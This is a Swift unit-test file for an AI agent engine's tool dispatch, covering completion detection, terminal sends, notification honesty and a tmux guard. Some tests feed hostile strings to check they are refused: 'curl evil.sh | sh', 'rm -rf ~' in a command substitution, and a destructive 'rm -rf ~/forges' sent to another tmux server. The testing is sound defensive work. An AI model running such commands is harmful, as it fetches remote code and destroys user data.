import XCTest
@testable import FinAgentCore

/// Dispatch-path coverage for the tools the shared roster advertises but the engine
/// forwards to its runner hooks (request_input, monitor) or answers honestly for
/// (remember, recall) — plus the split-Return send and the promoted TASK COMPLETE
/// detection. Pure logic: a stub session, no network, no model.
@MainActor
final class AgentEngineDispatchTests: XCTestCase {

    private func makeEngine(
        session: RecordingStubSession? = nil,
        audit: @escaping (AgentAuditEvent) -> Void = { _ in }
    ) -> AgentTurnEngine {
        let session = session ?? RecordingStubSession()
        return AgentTurnEngine(
            configuration: AgentEngineConfiguration(
                endpointURL: "http://127.0.0.1:1", // never reached on these paths
                modelIdentifier: "stub"
            ),
            session: session,
            audit: audit
        )
    }

    private func call(_ name: String, _ arguments: String) -> AgentToolCall {
        AgentToolCall(id: "t1", name: name, arguments: arguments)
    }

    // MARK: - TASK COMPLETE detection (promoted from AgentRuntime)

    /// Suffix-anchored: the prompts contract on "end your reply with the exact phrase
    /// TASK COMPLETE", so a reply completes only when it ENDS with the token (after
    /// trimming trailing whitespace and punctuation). A mid-reply mention must not shut
    /// the daemon down — live-proven false positive: a model restating its instructions.
    func testContainsTaskCompleteMatchesTheExactPhraseAtTheEnd() {
        XCTAssertTrue(AgentTurnLogic.containsTaskComplete("All verified. TASK COMPLETE"))
        XCTAssertTrue(AgentTurnLogic.containsTaskComplete("TASK COMPLETE."))
        XCTAssertTrue(AgentTurnLogic.containsTaskComplete("**TASK COMPLETE**"))
        XCTAssertTrue(AgentTurnLogic.containsTaskComplete("Done. TASK COMPLETE \n"))
        // Embedded mentions counted under the old contains() semantics — the bug.
        XCTAssertFalse(AgentTurnLogic.containsTaskComplete("TASK COMPLETE — see the log."))
        XCTAssertFalse(AgentTurnLogic.containsTaskComplete("TASK COMPLETE is what I will say later"))
        // The live false positive that completed a task and shut the process down.
        XCTAssertFalse(AgentTurnLogic.containsTaskComplete("I will only reply TASK COMPLETE when instructed..."))
        XCTAssertFalse(AgentTurnLogic.containsTaskComplete("task complete"))
        XCTAssertFalse(AgentTurnLogic.containsTaskComplete("The task is almost complete."))
        XCTAssertFalse(AgentTurnLogic.containsTaskComplete(""))
    }

    // MARK: - Split-Return send

    /// The paste-detection fix: the body and the Return must be two separate writes —
    /// a \r riding in the same stdin burst is treated by TUI input libraries as paste
    /// content (inserted, not submitted).
    func testSendInputSendsBodyThenReturnAsSeparateWrites() async {
        let session = RecordingStubSession()
        let engine = makeEngine(session: session)

        _ = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "echo hi\n", "await_output_seconds": 1}"#
        ))

        XCTAssertEqual(session.sentInputs, ["echo hi", "\r"],
                       "expected the typed body and a lone \\r, in that order")
    }

    /// Item 4's daemon-side half: a dropped write (the SSH channel goes away between the
    /// `isSessionConnected` pre-check and the actual write — a real, narrow TOCTOU window,
    /// not merely a disconnected-at-the-guard case) must surface as a real tool error, not
    /// a silent no-op the model believes succeeded and then waits out `awaitOutput`'s full
    /// timeout for a reply that can never arrive — same shape as the app's
    /// `AgentRuntime.executeSendInput` failure path (`fin/Agent/AgentRuntime.swift`), whose
    /// own coverage lives one layer down in `finTests/TerminalSessionSendTests.swift`.
    func testSendInputFailsWhenTheWriteIsNotConfirmed() async {
        let session = RecordingStubSession()
        session.failSends = true
        let engine = makeEngine(session: session)

        let result = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "echo hi\n", "await_output_seconds": 1}"#
        ))

        XCTAssertTrue(result.contains("sending input to the terminal failed"), "got: \(result)")
        XCTAssertTrue(result.contains("simulated write failure"), "expected lastError folded in: \(result)")
        XCTAssertTrue(session.sentInputs.isEmpty, "a failed write must not be recorded as sent")
    }

    // MARK: - remember / recall

    func testMemoryToolsAnswerHonestlyInsteadOfUnknownTool() async {
        var audited: [AgentAuditEvent] = []
        let engine = makeEngine(audit: { audited.append($0) })

        for name in [AgentToolSpec.remember.name, AgentToolSpec.recall.name] {
            let result = await engine.execute(call(name, "{}"))
            XCTAssertTrue(result.contains("unavailable in headless mode"), "got: \(result)")
            XCTAssertFalse(result.contains("unknown tool"),
                           "an advertised tool must never be answered as unknown")
        }
        XCTAssertEqual(audited.filter { $0.kind == "toolCall" }.count, 2,
                       "each memory call should still land in the audit trail")
    }

    // MARK: - request_input

    func testRequestInputFiresHookAndReturnsCannedAcknowledgment() async {
        var askedQuestions: [String] = []
        var audited: [AgentAuditEvent] = []
        let engine = makeEngine(audit: { audited.append($0) })
        engine.onRequestInput = { askedQuestions.append($0) }

        let result = await engine.execute(call(
            AgentToolSpec.requestInput.name,
            #"{"question": "Which branch should I deploy?"}"#
        ))

        XCTAssertEqual(askedQuestions, ["Which branch should I deploy?"])
        XCTAssertEqual(result, "The user has been notified. Their next message will answer your question.")
        XCTAssertTrue(audited.contains {
            $0.kind == "toolCall" && $0.text.contains("Which branch should I deploy?")
        }, "the question must be recorded in the audit log")
    }

    func testRequestInputRequiresAQuestion() async {
        let engine = makeEngine()
        engine.onRequestInput = { _ in XCTFail("hook must not fire for an empty question") }

        let result = await engine.execute(call(AgentToolSpec.requestInput.name, "{}"))
        XCTAssertTrue(result.contains("non-empty \"question\""), "got: \(result)")
    }

    func testRequestInputWithoutARunnerHookIsAnHonestError() async {
        let engine = makeEngine()
        let result = await engine.execute(call(
            AgentToolSpec.requestInput.name,
            #"{"question": "hello?"}"#
        ))
        XCTAssertTrue(result.hasPrefix("Error:"), "got: \(result)")
        XCTAssertTrue(result.contains("not available"), "got: \(result)")
    }

    // MARK: - monitor

    func testMonitorStartClampsTheIntervalAndReportsTheEffectiveCadence() async {
        let engine = makeEngine()
        var received: [Int] = []
        engine.onMonitorStart = { requested in
            received.append(requested)
            return requested == 0 ? 60 : requested // runner keeps 60s when told "keep"
        }

        // Below the floor → clamped up to 15.
        var result = await engine.execute(call(
            AgentToolSpec.monitor.name, #"{"action": "start", "interval_seconds": "5"}"#
        ))
        XCTAssertTrue(result.contains("every 15s"), "got: \(result)")

        // Above the ceiling → clamped down to 600.
        result = await engine.execute(call(
            AgentToolSpec.monitor.name, #"{"action": "start", "interval_seconds": "10000"}"#
        ))
        XCTAssertTrue(result.contains("every 600s"), "got: \(result)")

        // Unset → 0 reaches the runner ("keep current"), whose answer is reported.
        result = await engine.execute(call(AgentToolSpec.monitor.name, #"{"action": "start"}"#))
        XCTAssertTrue(result.contains("every 60s"), "got: \(result)")

        XCTAssertEqual(received, [15, 600, 0])
    }

    func testMonitorStopFiresHookAndConfirms() async {
        let engine = makeEngine()
        var stopped = false
        engine.onMonitorStop = { stopped = true }

        let result = await engine.execute(call(AgentToolSpec.monitor.name, #"{"action": "stop"}"#))
        XCTAssertTrue(stopped)
        XCTAssertEqual(result, "Monitoring disarmed.")
    }

    func testMonitorRejectsUnknownActions() async {
        let engine = makeEngine()
        engine.onMonitorStart = { _ in XCTFail("must not arm"); return 0 }
        engine.onMonitorStop = { XCTFail("must not disarm") }

        let result = await engine.execute(call(AgentToolSpec.monitor.name, #"{"action": "pause"}"#))
        XCTAssertTrue(result.contains("\"start\" or \"stop\""), "got: \(result)")
    }

    func testMonitorWithoutRunnerHooksIsAnHonestError() async {
        let engine = makeEngine()
        for arguments in [#"{"action": "start"}"#, #"{"action": "stop"}"#] {
            let result = await engine.execute(call(AgentToolSpec.monitor.name, arguments))
            XCTAssertTrue(result.contains("not available"), "got: \(result)")
        }
    }

    // MARK: - notify (proactively-social push)

    /// The 7th tool must ride in the shared roster the engine advertises, with the
    /// {title, body} schema and both fields required — a drift here changes what every
    /// backend exposes to the model.
    func testNotifyToolIsAdvertisedInTheSharedRoster() {
        XCTAssertTrue(AgentToolSpec.all.contains { $0.name == "notify" },
                      "notify must be part of the advertised roster")
        XCTAssertTrue(AgentToolSpec.knownToolNames.contains("notify"))

        let properties = AgentToolSpec.notify.parameters["properties"] as? [String: Any]
        XCTAssertNotNil(properties?["title"], "notify schema must expose a title property")
        XCTAssertNotNil(properties?["body"], "notify schema must expose a body property")
        let required = AgentToolSpec.notify.parameters["required"] as? [String]
        XCTAssertEqual(required.map(Set.init), Set(["title", "body"]),
                       "both title and body are required")
    }

    /// The happy path: the model chose to notify, so the runner's hook fires with the
    /// exact title and body, and the tool tells the model it was sent.
    func testNotifyFiresHookWithTitleAndBodyAndReportsSent() async {
        var pushes: [(title: String, body: String)] = []
        var audited: [AgentAuditEvent] = []
        let engine = makeEngine(audit: { audited.append($0) })
        engine.onNotify = { title, body in
            pushes.append((title, body))
            return .delivered // the channel confirmed the push went out
        }

        let result = await engine.execute(call(
            AgentToolSpec.notify.name,
            #"{"title": "Deploy done", "body": "main is live on prod; smoke tests green."}"#
        ))

        XCTAssertEqual(pushes.count, 1)
        XCTAssertEqual(pushes.first?.title, "Deploy done")
        XCTAssertEqual(pushes.first?.body, "main is live on prod; smoke tests green.")
        XCTAssertEqual(result, "Sent to the owner.")
        XCTAssertTrue(audited.contains {
            $0.kind == "toolCall" && $0.text.contains("Deploy done")
        }, "the notification must be recorded in the audit trail")
    }

    /// A configured-but-unreachable channel (hook reports unavailable) must be reported
    /// to the model honestly, not dressed up as a delivered push.
    func testNotifyReportsWhenNoChannelDelivered() async {
        let engine = makeEngine()
        engine.onNotify = { _, _ in .unavailable }

        let result = await engine.execute(call(
            AgentToolSpec.notify.name,
            #"{"title": "FYI", "body": "halfway through the migration."}"#
        ))
        XCTAssertTrue(result.contains("not reached"), "got: \(result)")
        XCTAssertFalse(result.hasPrefix("Sent"), "an undelivered push must not claim success")
    }

    /// A send that hasn't been confirmed within the runner's bounded wait must be
    /// reported as still in flight — never a false "sent" and never a false "failed".
    func testNotifyReportsQueuedWhenUnconfirmed() async {
        let engine = makeEngine()
        engine.onNotify = { _, _ in .queued }

        let result = await engine.execute(call(
            AgentToolSpec.notify.name,
            #"{"title": "FYI", "body": "still deploying."}"#
        ))
        XCTAssertTrue(result.contains("Queued"), "got: \(result)")
        XCTAssertFalse(result.hasPrefix("Sent"), "an unconfirmed push must not claim success")
        XCTAssertFalse(result.contains("not reached"), "a queued push is not the same as no channel")
    }

    /// A channel that IS configured and WAS attempted, but is confirmed not to have
    /// delivered, must read as a real failure — distinct from both "sent" and from "no
    /// channel configured" (a runner reports `.unavailable` only when nothing exists at
    /// all; a confirmed failed send on a real channel is a different fact).
    func testNotifyReportsFailedOnConfirmedFailure() async {
        let engine = makeEngine()
        engine.onNotify = { _, _ in .failed }

        let result = await engine.execute(call(
            AgentToolSpec.notify.name,
            #"{"title": "FYI", "body": "push channel is down."}"#
        ))
        XCTAssertTrue(result.contains("failed"), "got: \(result)")
        XCTAssertFalse(result.hasPrefix("Sent"), "a confirmed-failed push must not claim success")
        XCTAssertFalse(
            result.contains("No push channel is configured"),
            "a confirmed failure is not the same claim as no channel existing: got \(result)"
        )
    }

    func testNotifyRequiresABody() async {
        let engine = makeEngine()
        engine.onNotify = { _, _ in XCTFail("hook must not fire for an empty body"); return .delivered }

        let result = await engine.execute(call(
            AgentToolSpec.notify.name, #"{"title": "hi"}"#
        ))
        XCTAssertTrue(result.contains("non-empty \"body\""), "got: \(result)")
    }

    /// Same honesty as the memory/monitor tools: an advertised tool with no runner wiring
    /// says so plainly rather than lying that the owner heard it.
    func testNotifyWithoutARunnerHookIsAnHonestError() async {
        let engine = makeEngine()
        let result = await engine.execute(call(
            AgentToolSpec.notify.name,
            #"{"title": "hi", "body": "anyone there?"}"#
        ))
        XCTAssertTrue(result.hasPrefix("Error:"), "got: \(result)")
        XCTAssertTrue(result.contains("not available"), "got: \(result)")
    }

    /// The heart of the delegate-to-the-model design: notifying is the MODEL's choice, so
    /// nothing the engine does on its own — reading the terminal, arming/stopping a
    /// monitor, asking for input — may fire the notify hook. Only a `notify` tool call
    /// does. If this ever regresses, a heartbeat tick could spam the owner.
    func testOtherToolsNeverAutoFireNotify() async {
        let engine = makeEngine()
        engine.onNotify = { _, _ in
            XCTFail("no tool other than notify itself may push to the owner")
            return .delivered
        }
        engine.onRequestInput = { _ in }
        engine.onMonitorStart = { _ in 60 }
        engine.onMonitorStop = { }

        _ = await engine.execute(call(AgentToolSpec.readTerminal.name, "{}"))
        _ = await engine.execute(call(AgentToolSpec.requestInput.name, #"{"question": "which branch?"}"#))
        _ = await engine.execute(call(AgentToolSpec.monitor.name, #"{"action": "start"}"#))
        _ = await engine.execute(call(AgentToolSpec.monitor.name, #"{"action": "stop"}"#))
        // No XCTFail fired → nothing auto-notified.
    }

    // MARK: - The tmux send-keys guard on the send_input path

    /// The whole point of the guard now that the boundary is structural: a `send_input`
    /// that names ANOTHER tmux server never reaches the PTY, comes back as a tool result
    /// the model can act on, and lands in the audit trail as a failure. The turn continues
    /// — a refusal is a decision, not a crash.
    func testGuardedSendInputRefusesAnotherTmuxServer() async {
        let session = RecordingStubSession()
        session.environment["TMUX"] = "/private/tmp/tmux-501/fin,4242,0"
        var audited: [AgentAuditEvent] = []
        let engine = makeEngine(session: session, audit: { audited.append($0) })
        engine.tmuxGuard = TmuxSendGuard(
            isEnforced: true,
            ownSession: "fin",
            ownSocket: .name("fin")
        )

        let result = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "tmux -L default send-keys -t main 'rm -rf ~/forges' Enter"}"#
        ))

        XCTAssertTrue(session.sentInputs.isEmpty, "another server must never be reached")
        XCTAssertTrue(result.contains("REFUSED"), "got: \(result)")
        XCTAssertTrue(result.contains("-L default"), "the refusal must name the server — got: \(result)")
        XCTAssertTrue(result.contains("read_session"), "the refusal must offer the read path — got: \(result)")
        XCTAssertTrue(
            audited.contains { $0.kind == "error" && $0.isFailure },
            "a refusal must land in the audit trail"
        )
    }

    /// THE GUARD JUDGES THE BYTES THAT GET TYPED. `typedBody` strips the trailing newline
    /// before the PTY sees the line, and the forced pre-classification path appends one to
    /// every command it extracts — so a guard judging the raw tool argument decided
    /// `"tmux ls \\\n"` did not end in a backslash and allowed it, while the terminal
    /// really was left at PS2 with `tmux ls \` waiting for the next send to complete it.
    /// The trailing newline is the NORMAL shape, not an exotic one.
    func testHalfTypedSendInputIsRefusedDespiteTheTrailingNewline() async {
        let session = RecordingStubSession()
        session.environment["TMUX"] = "/private/tmp/tmux-501/fin,4242,0"
        let engine = makeEngine(session: session)
        engine.tmuxGuard = TmuxSendGuard(
            isEnforced: true,
            ownSession: "fin",
            ownSocket: .name("fin")
        )

        let result = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "tmux ls \\\n"}"#
        ))

        XCTAssertTrue(session.sentInputs.isEmpty, "a half-typed line must never reach the PTY")
        XCTAssertTrue(result.contains("REFUSED"), "got: \(result)")
        XCTAssertTrue(result.contains("one line"), "got: \(result)")
    }

    /// The other half: the guard is a socket check, not a tmux ban. Reading and writing
    /// on the agent's OWN server go through untouched, split-Return and all — including
    /// `-L fin`, which names that very server.
    func testGuardedSendInputStillDeliversAllowedTmuxCommands() async {
        let session = RecordingStubSession()
        let engine = makeEngine(session: session)
        engine.tmuxGuard = TmuxSendGuard(
            isEnforced: true,
            ownSession: "fin",
            ownSocket: .name("fin")
        )

        _ = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "tmux -L fin capture-pane -p -t fin-build", "await_output_seconds": 1}"#
        ))
        _ = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "tmux -L fin send-keys -t fin 'git status' Enter", "await_output_seconds": 1}"#
        ))
        _ = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "tmux -L fin new-session -d -s fin-build", "await_output_seconds": 1}"#
        ))

        XCTAssertEqual(session.sentInputs.count, 6, "three sends, each body + Return")
        XCTAssertTrue(session.sentInputs[0].contains("capture-pane"))
        XCTAssertTrue(session.sentInputs[2].contains("send-keys -t fin"))
        XCTAssertTrue(session.sentInputs[4].contains("-L fin new-session"))
    }

    /// NOTHING IS TYPED INTO THE TERMINAL TO DECIDE A REFUSAL. The engine used to probe the
    /// live shell for `$TMUX` before any send its cheap prefilter thought might be a tmux
    /// command — and that prefilter answers true for ANY input containing a quote or a
    /// backslash, because `tm"u"x` runs. So `git commit -m "wip"` typed
    /// `echo FIN_ENV_123456=$TMUX` + Return into the pane before the real command: in a
    /// shell it ran, in a REPL or vim it went into the program, and when nothing answered
    /// (a TUI re-renders the typed line, which the filter then skips) the turn also burned
    /// the timeout. The guard's rule no longer depends on the shell's environment, so there
    /// is nothing to ask.
    func testNoSendProbesTheShellWhateverItsQuoting() async {
        let session = RecordingStubSession()
        session.environment["TMUX"] = "/private/tmp/tmux-501/fin,4242,0"
        let engine = makeEngine(session: session)
        engine.tmuxGuard = TmuxSendGuard(
            isEnforced: true, ownSession: "fin", ownSocket: .name("fin")
        )

        for input in [
            "git status",                               // no quotes: never probed
            #"git commit -m \"fix the guard\""#,        // a quote: used to probe
            #"print(\"hi\")"#,                          // …into a python REPL
            "echo it's fine",
            "tmux -L fin ls",                           // a real tmux command: still no probe
        ] {
            _ = await engine.execute(call(
                AgentToolSpec.sendInput.name,
                #"{"input": "\#(input)", "await_output_seconds": 1}"#
            ))
        }

        XCTAssertEqual(session.sentInputs.count, 10, "five sends, each body + Return")
        XCTAssertTrue(session.environmentProbes.isEmpty,
                      "no send may type a probe into the pane — got \(session.environmentProbes)")
        XCTAssertFalse(
            session.sentInputs.contains { $0.contains("FIN_ENV_") },
            "and certainly not into a program the model is driving"
        )
    }

    /// The rule that replaced the probe, at the engine boundary: a socket-less tmux command
    /// is refused no matter what the shell would have said, and naming Fin's own socket is
    /// allowed no matter what the shell would have said. That is the whole reason the probe
    /// could go: its answer changed nothing.
    func testASocketLessTmuxIsRefusedAndTheOwnSocketIsSentWhateverTheShellSays() async {
        for reported in ["/private/tmp/tmux-501/fin,4242,0", "", "/private/tmp/tmux-501/default,1,0"] {
            let session = RecordingStubSession()
            session.environment["TMUX"] = reported
            let engine = makeEngine(session: session)
            engine.tmuxGuard = TmuxSendGuard(
                isEnforced: true, ownSession: "fin", ownSocket: .name("fin")
            )

            let refused = await engine.execute(call(
                AgentToolSpec.sendInput.name,
                #"{"input": "tmux send-keys -t main 'rm -rf ~/forges' Enter"}"#
            ))
            XCTAssertTrue(refused.contains("REFUSED"), "got: \(refused)")
            XCTAssertTrue(session.sentInputs.isEmpty, "nothing may be typed for a refusal")

            _ = await engine.execute(call(
                AgentToolSpec.sendInput.name,
                #"{"input": "tmux -L fin ls", "await_output_seconds": 1}"#
            ))
            XCTAssertEqual(session.sentInputs.count, 2, "the agent's own server is its own")
            XCTAssertTrue(session.environmentProbes.isEmpty)
        }
    }

    /// A host that never set the guard behaves exactly as it did before the guard
    /// existed — the app's posture, where tmux is optional and the user's own session is
    /// routinely named `main`.
    func testUnguardedEngineSendsTmuxCommandsUnchanged() async {
        let session = RecordingStubSession()
        let engine = makeEngine(session: session)

        _ = await engine.execute(call(
            AgentToolSpec.sendInput.name,
            #"{"input": "tmux send-keys -t main 'echo hi' Enter", "await_output_seconds": 1}"#
        ))

        XCTAssertEqual(session.sentInputs.count, 2)
        XCTAssertTrue(session.sentInputs[0].contains("send-keys -t main"))
    }

    // MARK: - read_session

    /// The honest-unavailability contract, identical to notify's: `read_session` is in the
    /// shared roster, so the app advertises it too, and a host that cannot provide it must
    /// say so rather than answer "unknown tool" (a lie about our own roster) or return an
    /// empty capture (a lie about the machine).
    func testReadSessionWithoutARunnerHookIsAnHonestError() async {
        let engine = makeEngine()
        let result = await engine.execute(call(
            AgentToolSpec.readSession.name, #"{"session": "main"}"#
        ))
        XCTAssertTrue(result.hasPrefix("Error:"), "got: \(result)")
        XCTAssertTrue(result.contains("not available"), "got: \(result)")
        XCTAssertFalse(result.contains("unknown tool"),
                       "an advertised tool must never be answered as unknown")
    }

    /// A RUNTIME THAT CANNOT SERVE A TOOL MUST NOT ADVERTISE IT. The roster is shared with
    /// the Fin app, and `read_session` needs the daemon's second SSH exec channel against a
    /// machine whose tmux sessions it manages — in the app it can only ever answer "not
    /// available here", while its own description ("this is the only way to see the others",
    /// "use it whenever you are asked what is running") is written to make the model call
    /// it. That costs a turn and prints an error row, every time someone asks the app what
    /// is running elsewhere. The app's routing prompt meanwhile tells the same model to use
    /// `tmux capture-pane` for that, so the two instructions contradicted each other and the
    /// tool-shaped one always failed.
    func testTheRosterDropsReadSessionForARuntimeThatCannotServeIt() {
        XCTAssertTrue(AgentToolSpec.roster(readSession: true).contains { $0.name == "read_session" })
        XCTAssertFalse(AgentToolSpec.roster(readSession: false).contains { $0.name == "read_session" })
        // Nothing else moves: the two rosters differ by exactly that one tool.
        XCTAssertEqual(
            AgentToolSpec.roster(readSession: true).count,
            AgentToolSpec.roster(readSession: false).count + 1
        )
        XCTAssertEqual(AgentToolSpec.roster(readSession: true).map(\.name),
                       AgentToolSpec.all.map(\.name))
        // …and the dispatch keeps its honest error for a model that names it anyway.
        XCTAssertTrue(AgentToolSpec.knownToolNames.contains("read_session"))
    }

    /// The name reaches the hook validated and unchanged, and the frame tells the model
    /// which session it is looking at — a capture with no label is a capture the model
    /// will attribute to the wrong terminal.
    func testReadSessionPassesAValidatedNameToTheHookAndFramesTheAnswer() async {
        var seen: [(String?, Int)] = []
        let engine = makeEngine()
        engine.onReadSession = { name, lines in
            seen.append((name, lines))
            return .text("$ swift test\nAll tests passed")
        }

        let result = await engine.execute(call(
            AgentToolSpec.readSession.name, #"{"session": "main", "lines": 40}"#
        ))

        XCTAssertEqual(seen.count, 1)
        XCTAssertEqual(seen.first?.0, "main")
        XCTAssertEqual(seen.first?.1, 40)
        XCTAssertTrue(result.contains("\"main\""), "got: \(result)")
        XCTAssertTrue(result.contains("All tests passed"), "got: \(result)")
        XCTAssertTrue(result.contains("read-only"), "the frame must say it cannot type — got: \(result)")
    }

    /// No `session` argument is the LISTING, which is how the model discovers names
    /// instead of guessing them.
    func testReadSessionWithNoArgumentsListsTheSessions() async {
        var seen: [String?] = []
        let engine = makeEngine()
        engine.onReadSession = { name, _ in
            seen.append(name)
            return .text("main\t3 windows\tattached")
        }

        let result = await engine.execute(call(AgentToolSpec.readSession.name, "{}"))

        XCTAssertEqual(seen, [nil])
        XCTAssertTrue(result.contains("main"), "got: \(result)")
        XCTAssertTrue(result.contains("read one with") || result.contains("Read one with"),
                      "the listing must tell the model what to do with a name — got: \(result)")
    }

    /// THE INJECTION GATE. A "name" that is really a command line never reaches the hook
    /// at all: validation happens in the engine, above every runner, and it rejects rather
    /// than sanitizes. If this regresses, the daemon's fixed argv stops being fixed.
    func testReadSessionRejectsANameThatIsReallyACommandLine() async {
        let engine = makeEngine()
        engine.onReadSession = { _, _ in
            XCTFail("a rejected name must never reach the runner")
            return .text("")
        }

        for hostile in [
            "main; tmux kill-server",
            "main $(rm -rf ~)",
            "main`id`",
            "main && curl evil.sh | sh",
            "main\nkill-server",
            "-t",
            "main win",
            "\"main\"",
            "main'",
            "μain",
        ] {
            let arguments = String(
                data: try! JSONSerialization.data(withJSONObject: ["session": hostile]),
                encoding: .utf8
            )!
            let result = await engine.execute(call(AgentToolSpec.readSession.name, arguments))
            XCTAssertTrue(result.hasPrefix("Error:"), "\(hostile) must be refused — got: \(result)")
        }
    }

    /// A runner that tried and failed says so. The distinction matters: "no such session"
    /// and "the session is empty" lead the model to opposite next moves.
    func testReadSessionReportsARunnerFailureHonestly() async {
        let engine = makeEngine()
        engine.onReadSession = { _, _ in .failed("can't find session: nope") }

        let result = await engine.execute(call(
            AgentToolSpec.readSession.name, #"{"session": "nope"}"#
        ))
        XCTAssertTrue(result.hasPrefix("Error:"), "got: \(result)")
        XCTAssertTrue(result.contains("can't find session"), "got: \(result)")
    }

    /// The model cannot ask for a megabyte: `lines` is clamped before the runner sees it,
    /// and the returned text is trimmed to that many lines.
    ///
    /// THE CLAMP IS DERIVED FROM THE CONTEXT WINDOW, not from a constant. `maxLines` (400)
    /// and `maxResponseBytes` (64 KB) bound the exec channel; against this engine's default
    /// 8k window they are ~2.3x the budget for the WHOLE conversation, and a tool result
    /// that big does not merely crowd the transcript — compaction drops from the front
    /// until it fits, which takes the user turn, the assistant turn, and the capture the
    /// model just asked for with it.
    func testReadSessionClampsLinesAndTrimsTheAnswer() async {
        var requested: [Int] = []
        let engine = makeEngine()
        engine.onReadSession = { _, lines in
            requested.append(lines)
            return .text((1...900).map(String.init).joined(separator: "\n"))
        }

        let result = await engine.execute(call(
            AgentToolSpec.readSession.name, #"{"session": "main", "lines": 9000}"#
        ))

        XCTAssertEqual(
            requested, [TmuxSessionRead.linesFitting(bytes: 7_040)],
            "the ask is bounded by what an 8k window can hold, not by maxLines"
        )
        let body = result.components(separatedBy: "\n")
        XCTAssertLessThanOrEqual(
            body.count, TmuxSessionRead.maxLines + 3,
            "the cap, plus one frame line and the two fence markers"
        )
        XCTAssertTrue(result.contains("900"), "the trim must keep the NEWEST lines")
        XCTAssertFalse(result.contains("\n1\n"), "the oldest lines are the ones dropped")
    }

    /// …and a runner that ignores the clamp entirely (or a pane whose lines are enormous)
    /// still cannot evict the conversation: the engine cuts what comes back to its own
    /// budget and says so, outside the fence.
    func testAnOversizedCaptureIsCutToFitAndTheModelIsTold() async {
        let engine = makeEngine()
        // What a runner may legitimately return: up to the exec channel's 64 KB cap, in
        // lines as wide as a real terminal. 88 lines (all an 8k window asks for) of a
        // 200-column pane is already ~18,000 characters — more than the whole budget.
        engine.onReadSession = { _, _ in
            .text((1...400).map { "line \($0) " + String(repeating: "=", count: 190) }
                .joined(separator: "\n"))
        }

        let result = await engine.execute(call(
            AgentToolSpec.readSession.name, #"{"session": "main"}"#
        ))

        XCTAssertLessThan(
            AgentTranscript.estimatedTokens(result), 2_500,
            "one tool result must not be able to fill an 8k window"
        )
        XCTAssertTrue(result.contains("Only the last"), "the cut must be disclosed — got: \(result.prefix(300))")
        XCTAssertTrue(result.contains("line 400 "), "and it must keep the NEWEST lines")
        // The note is in the header, not inside the fence, where a pane could have printed it.
        let header = result.components(separatedBy: TmuxSessionRead.beginMarker).first ?? ""
        XCTAssertTrue(header.contains("Only the last"), "got header: \(header)")
    }

    // MARK: - Turn visibility (item 6): turnStarted + real attempt/retry propagation

    /// `submit()` must record `turnStarted` the INSTANT the user message is recorded —
    /// before any tool call or LLM round trip — and every subsequent event in the same
    /// round trip must carry the REAL attempt/retry count `completeWithRetries` reaches,
    /// not a hardcoded 1/0.
    ///
    /// Exercised against a real, refused loopback connection rather than a mock:
    /// `AgentEndpointClient` calls `URLSession.shared` directly with no injectable
    /// transport, so there is no way to drive `completeWithRetries`'s retry loop
    /// without a real socket somewhere. Port 1 on 127.0.0.1 refuses instantly (an
    /// OS-level ECONNREFUSED, not a timeout) and needs no dev-machine setup — no SSH,
    /// no LM Studio — unlike this package's other network-adjacent live tests, which is
    /// why this one runs unconditionally instead of `XCTSkip`-ing itself.
    func testSubmitEmitsTurnStartedImmediatelyAndStampsRealAttemptRetryCounts() async {
        var events: [AgentAuditEvent] = []
        let engine = makeEngine(audit: { events.append($0) })

        _ = await engine.submit("hello")

        XCTAssertEqual(events.first?.kind, "userMessage")
        XCTAssertEqual(events.first?.attempt, 1)
        XCTAssertEqual(events.first?.retryCount, 0)

        let second = events.dropFirst().first
        XCTAssertEqual(second?.kind, "turnStarted",
                       "turnStarted must be the event right after userMessage — got: \(events.map(\.kind))")
        XCTAssertEqual(second?.attempt, 1)
        XCTAssertEqual(second?.retryCount, 0)

        let errorEvents = events.filter { $0.kind == "error" }
        XCTAssertEqual(
            errorEvents.map(\.attempt), [1, 2, 3],
            "each retry's own error event must carry the attempt that actually ran"
        )
        XCTAssertEqual(
            errorEvents.map(\.retryCount), [0, 1, 2],
            "retryCount is attempt - 1"
        )
    }
}
